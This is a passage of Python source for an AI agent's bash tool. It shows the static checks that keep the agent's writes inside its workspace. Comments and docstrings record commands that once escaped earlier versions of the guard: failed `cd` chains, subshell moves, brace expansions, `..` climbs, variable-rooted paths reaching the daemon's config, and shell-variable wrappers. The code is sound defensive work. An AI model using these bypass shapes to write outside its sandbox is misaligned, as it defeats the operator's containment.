    * ``cd <ws>/sub && echo x > ../gt-out.txt`` — allowed, and ``<ws>/gt-out.txt``
      really exists afterwards.
    * ``pushd <ws>/sub && echo x > ../gt-out.txt`` — refused as resolving to
      ``<ws>/../gt-out.txt``, while the same file lands *inside* (issue #1381).

    Reading it here does not widen anything: the pushed directory is used as the
    join base only when `_resolve_move_operand` places it *and* it is inside an
    allowed root, so the base is the directory the shell is really in — the join
    is the measured landing place, and the containment check below then refuses
    exactly the targets that leave the workspace. A ``pushd`` this walk cannot
    place keeps the start directory, which is the fail-closed reading.

    Returns the directory in effect at the statement that writes ``token``, or
    ``None`` when that cannot be proven — in which case the caller keeps the
    directory the child starts in, which is the fail-closed reading. Each
    bail-out below is a way this stream could name a directory the shell is not
    in:

    - **the token is written by exactly one statement.** The walk places a
      *statement*, and ``..`` is measured from the directory in effect there, so
      a token appearing in two statements has a write site the stream does not
      say which of them names — and the *first* one is not the safe guess:
      ``cd sub && echo ../back.txt && cd .. && echo x > ../back.txt`` really
      writes outside, while that occurrence's directory reads it as inside.
    - **only an ``&&`` chain may carry the move to the site.** ``;`` and ``||``
      run the next statement whether or not the ``cd`` succeeded, and a ``cd``
      that fails leaves the shell in the start directory — so the join would use
      a directory the shell never reached. Measured: ``cd nosuchdir; echo x >
      ../escape.txt`` and the ``||`` spelling of it both create the file
      *outside* the workspace, and both are allowed the moment this test is
      removed.
    - **a grouping boundary, a pipeline or a background job is not read.** Each
      can put a ``cd`` in a shell of its own, and the flat token stream cannot
      tell which statements run inside one. Measured: ``cd sub && (cd .. && echo
      x > ../back.txt)`` writes *outside* the workspace and is allowed as soon as
      this bail-out is removed — the inner move is invisible to the walk, which
      reads the parenthesis-led statement as no move at all. The same three tokens
      end `_resolve_from_command_assignment`'s reading, for the same reason. The
      price is the mirror case, ``cd sub && (echo x > ../back.txt)``, which
      writes inside and stays refused.
    - **a move this walk cannot resolve, or one that leaves the workspace.**
      The second is `_cwd_left_workspace`'s case and it refuses those targets
      already; the two must not disagree about which one answers a command.
      "Which one answers a command" includes the *prefix* dimension (issue
      #1385): both walks ask `_move_statement`/`_runs_as_a_command`, so both read
      a move behind `builtin`/`command` and both leave a word handed to `execve`
      unread. `env` is where the two still part company — the cwd walk answers
      `env -C <dir>` and follows a `cd` token behind any wrapper, this walk reads
      neither, because the redirect belongs to the shell that did not move — and
      that asymmetry is deliberate and measured, since reading `env cd sub` as a
      move here would allow a write that really leaves the workspace.
    - **a heredoc body left as text**, whose lines cannot be told from
      statements.

    A nested payload's own ``cd`` is deliberately not read: in ``sh -c 'cd sub;
    echo x > ../f'`` the token stream cannot say whether the write is inside
    that payload or beside it, and the conservative reading of the two is the
    one that keeps the refusal. That is a false block of the family this
    function fixes, kept rather than traded for a reading that can place the
    write in the wrong directory.
    """
    masked = _mask_data_heredoc_bodies(cmd)
    if not _no_heredoc_body_is_left_as_text(cmd, masked):
        return None
    tokens = _split_command_statements(masked)
    if any(tok in ("|", "&", "(", ")") for tok in tokens):
        return None
    statements: list[list[str]] = [[]]
    separators: list[str | None] = [None]
    for tok in tokens:
        if tok in _STATEMENT_SEPARATORS:
            statements.append([])
            separators.append(tok)
        else:
            statements[-1].append(tok)
    sites = [k for k, st in enumerate(statements) if token in st]
    if len(sites) != 1:
        return None
    site = sites[0]

    allowed = [workspace] + list(_trusted_write_zones()) + list(_temp_write_roots())
    cwd = os.path.realpath(workspace)
    first_move: int | None = None
    # Only the statements *before* the site can move the shell to where it
    # writes: a redirect attached to the `cd` itself (`cd sub > ../f`) is set up
    # before the `cd` runs, which is why the site's own statement is not read.
    for k, st in enumerate(statements[:site]):
        is_move, operand = _move_statement(st)
        if not is_move:
            continue
        if operand is None:
            return None
        dest = _resolve_move_operand(cmd, cwd, operand)
        if dest is None:
            return None
        if not any(src and (_is_within(dest, src) or dest == src) for src in allowed):
            return None
        cwd = dest
        if first_move is None:
            first_move = k
    if first_move is not None and any(
        separators[k] != "&&" for k in range(first_move + 1, site + 1)
    ):
        return None
    return cwd


# The shell's own statement separators. A newline is one of them, and it is the
# one the ordinary tokenizer cannot report: it is whitespace to `shlex`, so
# `T=<dir>` and the write that follows it on the next line arrive as one
# word-list instead of two statements (issue #1316).
_STATEMENT_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})
# `shlex`'s default punctuation set (`();<>|&`) plus the newline: asking for it
# as punctuation is what makes it a token rather than whitespace.
_STATEMENT_PUNCTUATION = "();<>|&\n"
# Everything `shlex` strips as whitespace except the newline, which the line
# above hands to the parser as punctuation instead. `\r` has to stay listed, or
# a CRLF command would glue the carriage return to the token before it.
_STATEMENT_WHITESPACE = " \t\r\v\f"


def _split_command_statements(cmd: str) -> list[list[str]]:
    """``cmd``'s statements as token lists, newlines kept as separators.

    The same lexer as `_split_command_tokens` in every respect but one: a newline
    is asked for as punctuation instead of being left as whitespace, so it arrives
    as its own token rather than disappearing. That is the whole difference
    between reading ``T=<dir>`` and ``cat > "$T/f"`` on two lines as one
    word-list and reading them as the two statements a shell runs — and it is why
    issue #1316's newline row could not be answered from the ordinary token
    stream. Only the statement boundary needs this; every other rule keeps the
    tokenizer it already had.
    """
    cmd = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = _shell_lexer(cmd, _STATEMENT_PUNCTUATION)
        lex.whitespace = _STATEMENT_WHITESPACE
        lex.whitespace_split = True
        return _restore_windows_backslashes(list(lex))
    except ValueError:
        return _restore_windows_backslashes(cmd.split())


def _heredoc_openers(line: str) -> list[tuple[str, bool]] | None:
    """``(delimiter, strips_tabs)`` for every heredoc opened on ``line``.

    ``None`` is "there is a ``<<`` here whose delimiter cannot be read", which is
    answered by refusing rather than by guessing. The scan is token-based for the
    reason `_heredoc_delimiters_read_as_data` records: a ``<<`` that is not its
    own token is a mention inside an argument (`grep -n "x <<EOF" f`), and one
    whose next token is not an identifier opens nothing (`python3 -c 'print(1 << 2)'`).
    """
    toks = _split_command_tokens(line)
    out: list[tuple[str, bool]] = []
    for idx, tok in enumerate(toks):
        if tok not in ("<<", "<<-"):
            continue
        nxt = toks[idx + 1] if idx + 1 < len(toks) else ""
        delim = nxt.lstrip("-")
        if not (delim and delim.isidentifier()):
            return None
        out.append((delim, tok == "<<-"))
    return out


def _no_heredoc_body_is_left_as_text(cmd: str, masked: str) -> bool:
    """Whether masking blanked *every* heredoc body in ``cmd``.

    `_mask_data_heredoc_bodies` blanks the bodies it can prove are data and
    leaves the rest, so a command can come back **half**-masked — one body blank,
    another still text. The rule below reads the remaining lines as statements,
    and a body left as text is exactly the input it must not read as one:
    measured on the tree that introduced it, a `cat <<EOF` body and a
    `myprog <<EOF` body in the same command answered ALLOW and resolved a write
    from a line of somebody's data, while `/bin/sh` put the write at `/f`.

    Asking the question directly — does any opener still sit above text that was
    not blanked? — is cheaper than linking each body to its consumer, and every
    answer it cannot give is "no": an unterminated opener, a delimiter it cannot
    read, and a body whose first line the terminator search reaches too early
    all end in the refusal this rule is called from.
    """
    before = cmd.split("\n")
    after = masked.split("\n")
    for k, line in enumerate(before):
        openers = _heredoc_openers(line)
        if openers is None:
            return False
        for name, strips_tabs in openers:
            end = next(
                (j for j in range(k + 1, len(before))
                 if before[j] == name
                 or (strips_tabs and before[j].strip("\t") == name)),
                None,
            )
            if end is None:
                return False
            if any(after[j].strip() for j in range(k + 1, end)):
                return False
    return True


def _leading_assignment_names(statement: list[str]) -> list[str]:
    """The names a statement assigns *before its command word* (``FOO=1 cmd``).

    The leading run is what a shell applies to the command it is about to run,
    and it stops at the first word that is not an assignment: in ``echo T=x`` the
    token ``T=x`` is an argument, not an assignment, and counting it as one would
    make an unrelated name look assigned twice.
    """
    names: list[str] = []
    for tok in statement:
        if not _is_env_assignment(tok):
            break
        names.append(tok.partition("=")[0])
    return names


def _commandless_assignment_pairs(statement: list[str]) -> list[tuple[str, str]]:
    """The ``NAME=value`` pairs a statement gives *the shell that runs it*.

    Only a statement made of assignments and nothing else does that: with no
    command word to attach them to, they are performed in the current shell and
    stay visible to later statements. ``T=tmp cmd > "$T/f"`` is the other shape —
    there the assignment is ``cmd``'s own environment, and the shell has already
    decided the redirect target without it (measured with ``/bin/sh`` in issue
    #1316: ``$T`` expands empty, so the file lands at ``/f``). Returning nothing
    for it is what keeps that spelling refused.
    """
    pairs: list[tuple[str, str]] = []
    for tok in statement:
        if not _is_env_assignment(tok):
            return []
        name, _, value = tok.partition("=")
        pairs.append((name, value))
    return pairs


def _assigned_value_is_decidable(value: str) -> bool:
    """Whether an assigned value can be resolved without guessing.

    A literal fragment only — `_ASSIGNED_LITERAL_VALUE_RE`, or a drive-rooted
    absolute value (`_ASSIGNED_DRIVE_ROOTED_VALUE_RE`, issue #1354) — with no
    ``..`` segment: the relative branch of the target rule assumes "relative
    therefore inside the workspace", so `T=../outside && cat > "$T/f"` is exactly
    the write that assumption cannot survive, and it stays refused (issue #1316).
    """
    if not (_ASSIGNED_LITERAL_VALUE_RE.match(value)
            or _ASSIGNED_DRIVE_ROOTED_VALUE_RE.match(value)):
        return False
    return ".." not in value.split("/")


def _resolve_from_command_assignment(cmd: str, token: str) -> str | None:
    """``token`` with the variables in it filled in from ``cmd``'s own assignments.

    Two call sites read this one rule, and they read it for the same reason:

      - the write-target rule, where the token is the file a redirect names
        (`T=.emrg/tmp && cat > "$T/f"`);
      - the moved-out walk, where the token is the directory a `cd` / `env -C`
        moves the shell into (`D=<dir> && cd "$D" && …`).

    Reading it in one place only is what let the two disagree: with the scope
    added for targets and not for moves, `D=<outside> && cd "$D" && cat > f`
    moved the shell out of the workspace while the walk, still expanding the
    environment alone, joined the literal `$D` onto the cwd and called the move
    "still inside" — the relative target behind it was then read as in-workspace
    (measured: BLOCK on master, ALLOW with the target-side scope only).

    Why the scope exists at all (issue #1316): the refusal this feeds reasons
    from the *environment* — `os.path.expandvars` against the variables the tool
    hands its child — and concludes that a token still carrying a variable root
    is one nobody can resolve. The environment is not the only resolution scope.
    A shell resolves `$T` at a write site from the values its own statements
    assigned earlier, so `T=.emrg/tmp && cat > "$T/f"` writes inside the
    workspace while the guard refused it. That shape is the ordinary way a
    scratch path is used, which makes the refusal a false block rather than a
    safety margin.

    The two spellings differ by one character and the shell treats them
    differently, and only one of them may open:

      - `T=.emrg/tmp && cat > "$T/f"` — a preceding statement's assignment is
        visible at the write site, so the target resolves;
      - `T=.emrg/tmp cat > "$T/f"` — the inline prefix is *not* visible to the
        redirect, so the shell writes `/f` and this keeps the refusal.

    The token may be a variable *root* (`$T/f`, whose value is spliced in) or the
    whole variable (`cd "$D"`, whose value replaces it): both are looked up the
    same way, because in both the shell reads the same assignment.

    Returns ``None`` whenever the answer is not provable, which is every case
    below; every one of them fails closed, so a command this cannot place keeps
    the refusal it has today rather than gaining an allowance:

      - the token is not a whole token of a statement at the top level (a
        redirect inside a nested `sh -c '<text>'` payload, or inside a heredoc
        body, is written by another shell — and an unexported variable expands to
        nothing there, so resolving it here would be the fail-open of issue
        #1316's `sh -c` row);
      - the command contains a heredoc whose body was *not* blanked, because then
        its lines cannot be told from statements — and an assignment written in a
        body is input, not a value any later `$T` sees;
      - a pipeline / background / subshell boundary anywhere in the command: each
        of those runs in a shell of its own, so an assignment on one side is not
        the value the other side sees;
      - the write site comes before the assignment, or the name is assigned more
        than once in the command (the value at the site is then not the one a
        single reading can name);
      - the assigned value is not a decidable literal.
    """
    if not (_UNRESOLVED_ROOT_RE.search(token) or _WHOLE_VAR_RE.match(token)):
        return None
    masked = _mask_data_heredoc_bodies(cmd)
    if not _no_heredoc_body_is_left_as_text(cmd, masked):
        # A body left as text: its lines cannot be told from statements, and an
        # assignment written in one is input no later `$T` ever sees.
        return None
    tokens = _split_command_statements(masked)
    if any(tok in ("|", "&", "(", ")") for tok in tokens):
        return None
    statements: list[list[str]] = [[]]
    for tok in tokens:
        if tok in _STATEMENT_SEPARATORS:
            statements.append([])
        else:
            statements[-1].append(tok)
    # The site is the statement carrying the token as a word of its own — the
    # redirect's target for the write rule, the `cd` operand for the move walk.
    site = next((k for k, st in enumerate(statements) if token in st), None)
    if site is None:
        return None
    # Assigned twice anywhere in the command ⇒ the value at the site is not the
    # one assignment a single reading can name. Counted over the whole command
    # rather than the prefix on purpose: a second assignment *after* the write
    # site also makes this undecidable without reading execution order, and an
    # undecidable command is refused.
    counts: dict[str, int] = {}
    for st in statements:
        for name in _leading_assignment_names(st):
            counts[name] = counts.get(name, 0) + 1
    values: dict[str, str] = {}
    for st in statements[:site]:
        for name, value in _commandless_assignment_pairs(st):
            values[name] = value
    resolved = token
    while True:
        m = _LEADING_VAR_ROOT_RE.match(resolved)
        if m is not None:
            # A root: the value is spliced in front of the separator the
            # lookahead stopped at, which stays in the text.
            name, tail = m.group(1), resolved[m.end():]
        else:
            # The whole token is the variable (`cd "$D"`): there is no separator
            # to stop at, so the value is the token entire. Read in the same
            # loop because it is the same lookup.
            m = _WHOLE_VAR_RE.match(resolved)
            if m is None:
                break
            name, tail = m.group(1), ""
        value = values.get(name)
        if (value is None or counts.get(name) != 1
                or not _assigned_value_is_decidable(value)):
            return None
        resolved = value + tail
    if resolved == token or _UNRESOLVED_ROOT_RE.search(resolved):
        # Nothing was filled in (the root is spelled in a way no assignment can
        # be matched to — an expansion operator, or a variable that is not the
        # leading word), or the fill-in stopped at a root it cannot reach (a
        # second variable later in the same path, `"$A/$B/c"`). Either way the
        # target arrives as placed as it was, so it keeps the refusal: half a
        # resolved path is not a path this guard can prove anything about.
        return None
    return resolved


def _check_sandbox(cmd: str, mode: str, workdir: str | None = None) -> tuple[bool, str | None, str]:
    """Static sandbox check for a bash command (rant 2026-08-20T15:46:50).

    Returns ``(allowed, blocked_reason, enforcement)``:
      - danger-full-access → (True, None, "full") — no checks, current behavior.
      - read-only → blocks every destructive write (rm -r / rmdir / unlink /
        mv / cp -r and shell redirects to any non-/dev/null target).
      - workspace-write → blocks destructive writes to protected daemon
        files, to ``~/.emrg`` itself, and to absolute paths outside the
        workspace root (the OS temp dir is allowed — mirrors dsh's
        workspace + backend-promised temp area).

    Heuristic by design: static scan only, no OS-level boundary — checked
    modes honestly report enforcement="partial".
    """
    if mode not in SANDBOX_MODES:
        return False, f"invalid sandbox mode {mode!r}", "partial"
    if mode == "danger-full-access":
        return True, None, "full"

    # Containment-escape guard (issue #1102): destination-based, applies to
    # both checked tiers. A metadata-credential fetch is a READ and escapes
    # the write-target scan below — it must run before the early returns.
    escape = _check_containment_escape(cmd)
    if escape:
        return False, escape, "partial"

    targets = _extract_write_targets(cmd) + _unresolved_wrapper_targets(cmd)
    if mode == "read-only":
        for t in targets:
            if t != "/dev/null":
                return False, (
                    f"read-only sandbox: blocked destructive write targeting {t!r}"
                ), "partial"
        # Git mutators are blocked too — the 2026-08-20 data-loss commands
        # (stash / checkout . / reset --hard / clean) write no file targets
        # and escaped the target scan (community issue #979). Also blocks
        # working-tree writers: apply / am / archive / submodule / worktree.
        #
        # Decided by **parsed verb**, not raw text (issues #1156 + #1159): a
        # global option between `git` and the subcommand used to defeat the
        # alternation, `git read-tree -u --reset` was never on the list, and
        # a command merely *mentioning* a mutator was refused. Chained commands
        # are judged per invocation, so `git stash list && git stash drop` still
        # blocks while a bare `git stash list` reads.
        hit = _find_git_mutator(cmd)
        if hit:
            return False, (
                f"read-only sandbox: blocked git mutating command {hit!r} "
                "(dirty-tree guard, community issue #979)"
            ), "partial"
        return True, None, "partial"

    # workspace-write
    if not targets:
        return True, None, "partial"
    protected = _protected_paths()
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    workdir_real = os.path.realpath(workdir) if workdir else None
    # A relative target is in-workspace only while the command writes from where
    # it started; a command that moves the shell out first (issue #1244)
    # makes the relative reading name a file the guard cannot place.
    #
    # The cwd that question is asked about is this process's when the caller
    # declared none — the child inherits it (execute() passes `cwd=workdir`, and
    # a None cwd means "inherit"). Reading `workdir_real` alone meant an omitted
    # workdir skipped the check entirely, so `cd <outside> && cat > f` was
    # refused with the workspace declared and *allowed* without it (issue
    # #1359). The boundary is not widened in exchange: `allowed_srcs` below still
    # takes a declared workspace only, so an omitted workdir can never permit
    # something a declared one refuses — for relative targets the two readings
    # are now equal, and for absolute ones the omitted reading stays the
    # stricter of the pair.
    cwd_real = workdir_real if workdir_real else os.path.realpath(os.getcwd())
    moved_out = _cwd_left_workspace(cmd, cwd_real)
    for t in targets:
        if t == "/dev/null":
            continue
        expanded = os.path.expanduser(os.path.expandvars(t))
        if _BRACE_EXPANSION_RE.search(expanded):
            # The same class as the move rule, refused on the same ground (issue
            # #1396): a brace list is several operands and this walk cannot say
            # which spelling the shell takes, so a target carrying one is not one
            # the guard can prove stays in the workspace. Read literally it is a
            # *relative* name, i.e. inside — measured on master `67ba7f52`,
            # `rm -rf {../emrg-1396-outside/doomed,inside}` and
            # `tee {../emrg-1396-outside/written,inside}` were both ALLOW, and both
            # really reach the sibling directory when driven in `/bin/sh` (the
            # verbs take several operands, so the expanded list is simply handed to
            # them). A *redirect* is the one shape that does not escape — bash
            # answers "ambiguous redirect" and writes nothing, measured with the
            # other two — but it is refused with the rest, because for this walk
            # the two spellings are the same text and the guard has no wish to
            # depend on which verb it was handed to. The bare-operand exemption the
            # variable rule keeps for `cp $SRC $DST` has no analogue here: a brace
            # operand is several operands, so it is refused with them. The price is
            # stated rather than hidden — `rm {dist,build}` is refused too, because
            # every spelling being inside is exactly what the text does not say.
            return False, (
                f"workspace-write sandbox: blocked write to {t!r}, whose text is a "
                "brace expansion the guard cannot place (issue #1396)"
            ), "partial"
        if not _is_absolute_path(expanded) and _UNRESOLVED_ROOT_RE.search(expanded):
            # The environment is not the only resolution scope (issue #1316): a
            # variable the *command itself* assigned in an earlier statement is
            # one the shell resolves at the write site, so the refusal below asks
            # the command before it answers "nobody can resolve this". A resolved
            # value then travels the ordinary path — absolute values reach the
            # `_is_within` / protected-file checks, relative ones still face the
            # `moved_out` check, and a spelling the command cannot place keeps the
            # refusal it has today.
            from_command = _resolve_from_command_assignment(cmd, t)
            if from_command is not None:
                expanded = os.path.expanduser(os.path.expandvars(from_command))
        if not _is_absolute_path(expanded):
            if _UNRESOLVED_ROOT_RE.search(expanded):
                # `$HOME/…` and `$TMPDIR/…` were resolved above against the
                # environment the tool hands its child, so a path that *still*
                # carries a variable root is one nobody can resolve — and
                # without this the shell would reach an absolute path the guard
                # read as "relative, therefore inside the workspace" (measured on
                # master: `echo x > $UNKNOWN/repo/out254.txt` is ALLOW there, and
                # `echo x > $HOME/.emrg/config.toml` — the daemon's own config —
                # was ALLOW for the same reason until expansion was added above).
                # A target whose root cannot be resolved is not one the guard can
                # prove stays in the workspace, so it fails closed instead of
                # guessing. A bare `$VAR` operand is left as it was: there the
                # variable is the whole name and the relative reading below
                # covers it exactly as it covers any other unresolvable name —
                # blocking it would refuse `cp $SRC $DST`, a defect report of its
                # own.
                return False, (
                    f"workspace-write sandbox: blocked write to {t!r}, whose root is "
                    "a shell variable neither the environment nor the command's own "
                    "assignments can resolve (issue #1244)"
                ), "partial"
            # Relative target: assumed in-workspace (cwd = the workspace root) —
            # an assumption the command itself can invalidate by moving the
            # shell first, so it is only made when the command left the cwd it
            # started in. `cd <outside>; echo x > out.txt` truncated a file
            # outside the workspace while this line read it as inside (issue
            # #1244); the block names the directory that made it possible.
            if moved_out is not None:
                return False, (
                    f"workspace-write sandbox: blocked write to relative target {t!r}: "
                    f"the command runs it after changing directory to {moved_out!r}, "
                    "which is not a directory this workspace can place it in (issue #1244)"
                ), "partial"
            # …and the target itself can invalidate it without moving anything,
            # by climbing out with `..` (issue #1353). The assumption above is
            # about *where* the write lands, so it is only sound while the
            # resolved target is still under the directory the command runs in:
            # `echo x > ../escaped.txt` was ALLOW here, exited 0, and created the
            # file outside the workspace (measured end to end). The base is the
            # directory the child actually starts in — the declared workspace,
            # or this process's cwd when the caller declared none, which is what
            # `execute()` hands the child as `cwd=None` (issue #1359).
            #
            # This only ever *adds* refusals: every relative target was allowed
            # before, and the test's omitted/declared property (issue #1359) is
            # preserved because both readings resolve against the directory the
            # child runs in and both then require the result to stay under it.
            start_base = workdir_real if workdir_real else cwd_real
            # …but the directory the child starts in is the join base only while
            # the command writes *from* where it started. A `cd` that stays
            # inside the workspace moves the write site too, and the same text
            # then names a different file: `cd sub && echo x > ../back.txt`
            # creates <workspace>/back.txt — inside — while the join onto the
            # start directory reads <workspace>/../back.txt and refuses it,
            # naming a directory the file never appears in (issue #1370). The
            # join base is therefore the directory in effect at the write site,
            # when the walk can prove which one that is; otherwise the start
            # directory, which is the fail-closed reading.
            site_base = _cwd_at_write_site(cmd, start_base, t)
            base = site_base if site_base is not None else start_base
            real = os.path.realpath(os.path.join(base, expanded))
            if real in protected:
                return False, (
                    f"workspace-write sandbox: blocked write to protected daemon file {t!r}"
                ), "partial"
            if real == emrg_home:
                return False, (
                    f"workspace-write sandbox: blocked destructive write to {t!r} "
                    "(would erase the daemon's data directory)"
                ), "partial"
            # The write-site directory may be the *join base* but never a write
            # root as well: <workspace>/back.txt is not "inside
            # <workspace>/sub", so substituting both readings would refuse two
            # of the three rows the join fixes (issue #1370, measured). Only the
            # join moves; containment stays a question about the directory the
            # child starts in.
            relative_allowed = (
                [start_base] + list(_trusted_write_zones()) + list(_temp_write_roots())
            )
            if not any(
                src and (_is_within(real, src) or real == src)
                for src in relative_allowed
            ):
                return False, (
                    f"workspace-write sandbox: blocked write to relative target {t!r}: "
                    f"it resolves to {real!r}, outside {base!r}, the directory the "
                    "command runs in (issue #1353)"
                ), "partial"
            continue
        real = os.path.realpath(expanded)
        if real in protected:
            return False, (
                f"workspace-write sandbox: blocked write to protected daemon file {t!r}"
            ), "partial"
        if real == emrg_home:
            return False, (
                f"workspace-write sandbox: blocked destructive write to {t!r} "
                "(would erase the daemon's data directory)"
            ), "partial"
        allowed_srcs = [workdir_real] if workdir_real else []
        allowed_srcs += list(_trusted_write_zones())
        allowed_srcs += list(_temp_write_roots())
        if not any(
            src and (_is_within(real, src) or real == src) for src in allowed_srcs
        ):
            return False, (
                f"workspace-write sandbox: blocked write outside workspace {t!r}"
            ), "partial"
    return True, None, "partial"


def _unresolved_wrapper_payloads(tokens: list[str]) -> list[str]:
    """Payloads of tokens the guard cannot resolve to a program.

    A token is a possible *wrapper* when its command word is a variable
    reference (`$SHELL`, `${SHELL}`, `"$SHELL"` — the tokenizer dequotes — and
    their assignment-prefixed spellings) rather than the name of a shell.
    Nothing in the text says whether that variable holds a shell, so what
    follows it is read as a command that may run: the same over-approximation a
    named wrapper already gets, and one that can only add blocking, never
    remove it (issue #1244).
    """
    out: list[str] = []
    for i, tok in enumerate(tokens):
        # The token as written *and* its basename. A `/` inside `${…}` is not a
        # directory separator, so `_basename("${SHELL//x/y}")` is `y}` — the
        # expansion would be cut in half and read as neither. Measured on master
        # `cca0b8dc`: `${SHELL//x/y} -c 'git checkout .'` is a live wrapper (the
        # shell expands it to the interpreter and runs the mutator), and the
        # guard answered ALLOW because the basename was `y}`. The basename test
        # stays: it is what recognises `/usr/bin/$SHELL`.
        if (
            _UNRESOLVED_VAR_RE.fullmatch(tok)
            or _UNRESOLVED_VAR_RE.fullmatch(_basename(tok))
        ):
            out.extend(tokens[i + 1:])
    return out


def _unresolved_wrapper_targets(cmd: str, _depth: int = 0) -> list[str]:
    """Write targets inside the payload of an un-resolvable wrapper.

    `_extract_write_targets` reads one command text, and a redirect inside a
    quoted payload is a character rather than an operator — so
    `$SHELL -c 'echo x > f'` named no target at all while the shell truncated
    `f` (measured on master). The payload of a wrapper the guard cannot resolve
    is not provably data, so the target rule reads it as a command for the same
    reason `_find_git_mutator` already does.

    Depth is capped rather than trusted: a guard must terminate on adversarial
    input.
    """
    if _depth >= 3:
        return []
    out: list[str] = []
    for nested in _unresolved_wrapper_payloads(_tokenize_command(cmd)):
        out.extend(_extract_write_targets(nested))
        out.extend(_unresolved_wrapper_targets(nested, _depth + 1))
    return out


def _decode_output(data: bytes, os_name: str | None = None) -> str:
    """Decode subprocess output bytes without corrupting non-UTF-8 text.

    POSIX: subprocess output is UTF-8 — unchanged behavior.

    Windows: cmd.exe/dir/echo output uses the console locale code page
    (GBK/cp936 on zh-CN), while git/gh emit UTF-8. Both must decode
    correctly, so we try the locale encoding **strictly** first and fall
    back to UTF-8 (also strict), then to UTF-8 with replacement as a last
    resort (rant 2026-08-08T09:35:30 — U+FFFD garbage from decoding GBK
    bytes as UTF-8).

    Scope of what strictness buys: it catches the case where the UTF-8 bytes
    are *invalid* in the locale codec. It does not catch the case where they
    are *also valid* there - a 2-byte UTF-8 sequence is exactly the shape of a
    GBK pair, so the first pass succeeds and the fallback is never reached.
    Measured on a cp936 host (this function, ``os_name="nt"``): 6 of 8
    Latin-1-range samples are silently mojibaked - ``café`` -> ``caf茅``,
    ``über`` -> ``眉ber``, ``señor`` -> ``se帽or`` - while 3-byte
    sequences (CJK, the inputs this policy was written for) fall through
    correctly. A path is filesystem bytes, not console bytes: readers that
    carry paths pin ``encoding="utf-8"`` outright rather than relying on this
    heuristic (see ``tests/test_script_decode_is_locale_independent.py``).

    ``os_name`` is injectable for tests (defaults to ``os.name``).
    """
    if not data:
        return ""
    name = os_name or os.name
    if name == "nt":
        enc = locale.getpreferredencoding(False) or "utf-8"
        for candidate in (enc, "utf-8"):
            try:
                return data.decode(candidate)  # strict
            except (LookupError, UnicodeDecodeError):
                continue
    return data.decode("utf-8", errors="replace")


class BashTool(ToolExecutor):
    """Execute shell commands via asyncio subprocess."""

    def definition(self) -> ToolDefinition:
        return ToolDefinition(
            name="bash",
            description=(
                "Execute a shell command and return stdout and stderr. "
                "Use for running tests, git commands, listing files, "
                "installing packages, and other shell operations. "
                "Commands run in the working directory by default; "
                "use the `workdir` parameter to override."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to execute. Bash heredocs "
                        "(cmd <<'EOF' ... EOF) are supported on all platforms "
                        "— on Windows they are auto-translated to stdin redirects.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds (default: 30).",
                    },
                    "workdir": {
                        "type": "string",
                        "description": "Working directory for the command (default: project root).",
                    },
                    "intent": {
                        "type": "string",
                        "description": "The purpose of this call: why you are invoking it and what you want to achieve. "
                        "One human-readable sentence, e.g. 'check how billing is implemented in billing.rs'.",
                    },
                },
                "required": ["command", "intent"],
            },
        )

    async def execute(self, arguments: dict) -> ToolResult:
        cmd = arguments.get("command", "")
        timeout = arguments.get("timeout", 30)
        workdir = arguments.get("workdir", None)
        # Sandbox tier — daemon-injected per task config (the agent cannot
        # choose its own sandbox; rant 2026-08-20T15:46:50).
        sandbox = arguments.get("sandbox")

        if not cmd:
            return ToolResult(name="bash", content="Error: no command provided", error=True)

        # Static file-level isolation check (rant 2026-08-20T15:46:50).
        sandbox_tag: str | None = None
        containment_warning: str | None = None
        if sandbox and sandbox != "danger-full-access":
            allowed, reason, enforcement = _check_sandbox(cmd, sandbox, workdir)
            if not allowed:
                logger.info("bash: BLOCKED by %s sandbox: %s", sandbox, reason)
                return ToolResult(
                    name="bash",
                    content=(
                        f"⛔ [sandbox:{sandbox} enforcement={enforcement}] "
                        f"{reason} — command not executed"
                    ),
                    error=True,
                )
            sandbox_tag = f"[sandbox:{sandbox} enforcement={enforcement}]"
            logger.debug("bash: sandbox %s check passed", sandbox)
        elif sandbox == "danger-full-access":
            # Issue #1102: the danger tier opts into no blocking, but a
            # containment-escape command still gets a visible warning so the
            # caller can spot credential exfiltration in the tool result.
            containment_warning = _check_containment_escape(cmd)

        logger.debug("bash: running %r (timeout=%ds)", cmd[:100], timeout)

        # Windows: cmd.exe cannot parse bash heredocs — translate the first
        # one to a stdin redirect (host sessions 2026-08-14T21:26/21:36 hit
        # "此时不应有 <<" with browser-harness <<'PY'). POSIX unchanged.
        temp_path = None
        if os.name == "nt":
            cmd, temp_path = _translate_windows_heredocs(cmd)

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=workdir,
                # Non-interactive daemon: git/gh children must fail fast
                # silently, never spawn GCM/askpass popups (rant
                # 2026-08-07T10:17:27).
                env=no_prompt_env(),
                preexec_fn=os.setsid if os.name != "nt" else None,
                # Windows: background daemon children must never pop a
                # console window (rant 2026-08-09T13:16:36 — cmd-window
                # storm; bash tool was a top contributor).
                **win32_no_window_kwargs(),
            )
            try:
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=timeout
                )
            except asyncio.TimeoutError:
                # Kill entire process group to prevent orphaned children
                try:
                    if os.name != "nt":
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    else:
                        proc.kill()
                except (ProcessLookupError, OSError):
                    proc.kill()
                await proc.wait()
                return ToolResult(
                    name="bash",
                    content=f"Command timed out after {timeout}s: {cmd[:100]}",
                    error=True,
                )
            finally:
                if temp_path:
                    try:
                        os.unlink(temp_path)
                    except OSError:
                        pass

            out = _decode_output(stdout).rstrip()
            err = _decode_output(stderr).rstrip()

            # Smart truncation: keep stderr intact (errors are critical),
            # truncate stdout with head+tail when output exceeds limit.
            # This ensures build/test errors at the tail aren't lost.
            ERR_MAX = 30_000  # Always keep stderr up to this
            HEAD_TAIL_RATIO = 0.6  # 60% head, 40% tail
            _SEP = "\n[stderr]\n"  # 10 chars, separator prefix

            if len(err) > ERR_MAX:
                half = ERR_MAX // 2
                err = (
                    f"{err[:half]}\n\n"
                    f"... [stderr truncated: {len(err)} → {ERR_MAX} chars, head+tail kept]"
                    f"\n\n{err[-half:]}"
                )

            # Calculate remaining budget for stdout (accounting for separator)
            err_overhead = len(_SEP) if (out and err) else 0
